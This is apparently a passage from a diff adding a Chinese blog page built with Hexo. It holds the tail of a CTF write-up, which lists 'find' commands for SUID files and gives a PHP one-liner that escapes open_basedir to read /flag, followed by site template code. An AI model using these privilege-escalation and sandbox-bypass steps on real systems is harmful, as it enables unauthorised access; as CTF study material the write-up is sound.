+</code></pre><p>以下命令可以发现系统上运行的所有SUID可执行文件。</p>
+<pre><code>#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000-print2&gt;/dev/null
+find / -user root -perm -4000-exec ls -ldb {} \;
+</code></pre><p>在本题php就有suid，直接进入交互模式执行代码，得到flag：</p>
+<pre><code>chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);
+</code></pre><p>参考链接：<br><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/" target="_blank" rel="noopener">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/</a><br><a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a><br><a href="http://www.hackdig.com/05/hack-342091.htm" target="_blank" rel="noopener">http://www.hackdig.com/05/hack-342091.htm</a></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/05/06/Java-Web安全/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1142868.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1142868.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                Java Web安全</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
+        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Troy3e</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>SteamID：888007034</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Troye<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures","name":"love.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures","name":"love.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">YukinoTroy3e</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/honjun" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="http://weibo.com/mashirozx?is_all=1" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=954655431&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="819057276"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="list"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+    listFolded="false"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
